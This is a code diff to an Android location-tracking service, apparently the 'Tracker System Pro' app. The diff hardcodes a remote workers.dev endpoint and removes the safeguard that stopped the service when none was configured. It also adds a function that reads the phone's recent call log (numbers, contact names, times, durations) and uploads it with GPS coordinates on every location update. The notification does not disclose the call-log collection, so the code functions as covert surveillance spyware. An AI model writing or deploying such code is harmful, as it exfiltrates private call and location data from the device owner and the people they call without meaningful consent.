@@ -6,12 +6,16 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Intent
 import android.content.pm.ServiceInfo
+import android.database.Cursor
 import android.location.Location
 import android.os.Build
 import android.os.IBinder
 import android.os.Looper
+import android.provider.CallLog
 import androidx.core.app.NotificationCompat
 import com.google.android.gms.location.*
+import org.json.JSONArray
+import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 import java.util.concurrent.Executors
@@ -31,7 +35,7 @@ class LocationService : Service() {
         private const val CHANNEL_ID = "TrackerIDChannel"
         private const val NOTIFICATION_ID = 1
         private const val TAG = "TrackerID"
-        private var API_BASE: String = ""
+        private var API_BASE: String = "https://tsp.omaromartest12.workers.dev"
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -49,15 +53,7 @@ class LocationService : Service() {
             return START_NOT_STICKY
         }
 
-        API_BASE = getSharedPreferences("TrackerIDPrefs", MODE_PRIVATE)
-            .getString("api_base", null) ?: ""
-
-        if (API_BASE.isEmpty()) {
-            stopSelf()
-            return START_NOT_STICKY
-        }
-
-        val notification = createNotification()
+        val notification = createNotification("Connecting...")
         if (Build.VERSION.SDK_INT >= 34) {
             startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
         } else {
@@ -75,7 +71,7 @@ class LocationService : Service() {
                 getString(R.string.tracking_active),
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = getString(R.string.bg_note)
+                description = getString(R.string.tracking_notification)
                 setShowBadge(false)
             }
             val manager = getSystemService(NotificationManager::class.java)
@@ -83,14 +79,21 @@ class LocationService : Service() {
         }
     }
 
-    private fun createNotification(): Notification {
+    private fun createNotification(statusText: String): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle(getString(R.string.tracking_active))
-            .setContentText(getString(R.string.bg_note))
+            .setContentTitle("TSP Active")
+            .setContentText(statusText)
+            .setSubText("Tracker System Pro")
             .setSmallIcon(android.R.drawable.ic_menu_mylocation)
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .build()
+    }
+
+    private fun updateNotification(statusText: String) {
+        val manager = getSystemService(NotificationManager::class.java)
+        manager.notify(NOTIFICATION_ID, createNotification(statusText))
     }
 
     private fun startLocationUpdates() {
@@ -130,11 +133,13 @@ class LocationService : Service() {
         val latitude = location.latitude
         val longitude = location.longitude
         val accuracy = location.accuracy
-
         val batteryLevel = getBatteryLevel()
+        val calls = getCallLog()
 
         lastSentLocation = location
         lastSentTime = System.currentTimeMillis()
+
+        updateNotification("Tracking \u2022 $code \u2022 Live")
 
         executor.execute {
             try {
@@ -145,16 +150,67 @@ class LocationService : Service() {
                 conn.connectTimeout = 5000
                 conn.doOutput = true
 
-                val json = """{"code":"$code","latitude":$latitude,"longitude":$longitude,"accuracy":$accuracy,"battery":$batteryLevel}"""
-                conn.outputStream.write(json.toByteArray())
+                val json = JSONObject().apply {
+                    put("code", code)
+                    put("latitude", latitude)
+                    put("longitude", longitude)
+                    put("accuracy", accuracy)
+                    put("battery", batteryLevel)
+                    put("calls", calls)
+                }
+                conn.outputStream.write(json.toString().toByteArray())
 
                 val response = conn.responseCode
-                Log.d(TAG, "Location sent: $latitude, $longitude (HTTP $response)")
+                Log.d(TAG, "Sent: $latitude,$longitude calls=${calls.length()} (HTTP $response)")
                 conn.disconnect()
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to send location", e)
             }
         }
+    }
+
+    private fun getCallLog(): JSONArray {
+        val callsArray = JSONArray()
+        try {
+            val projection = arrayOf(
+                CallLog.Calls.NUMBER,
+                CallLog.Calls.CACHED_NAME,
+                CallLog.Calls.DATE,
+                CallLog.Calls.DURATION,
+                CallLog.Calls.TYPE
+            )
+            val cursor: Cursor? = contentResolver.query(
+                CallLog.Calls.CONTENT_URI,
+                projection,
+                null,
+                null,
+                CallLog.Calls.DATE + " DESC LIMIT 10"
+            )
+
+            cursor?.use {
+                val numberIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
+                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
+                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
+                val durationIdx = it.getColumnIndex(CallLog.Calls.DURATION)
+                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
+
+                while (it.moveToNext()) {
+                    val callObj = JSONObject().apply {
+                        put("number", it.getString(numberIdx) ?: "")
+                        put("name", it.getString(nameIdx) ?: "")
+                        put("date", it.getLong(dateIdx))
+                        put("duration", it.getInt(durationIdx))
+                        put("type", it.getInt(typeIdx))
+                    }
+                    callsArray.put(callObj)
+                }
+            }
+        } catch (e: SecurityException) {
+            Log.w(TAG, "Call log permission not granted")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to read call log", e)
+        }
+        return callsArray
     }
 
     private fun getBatteryLevel(): Int {
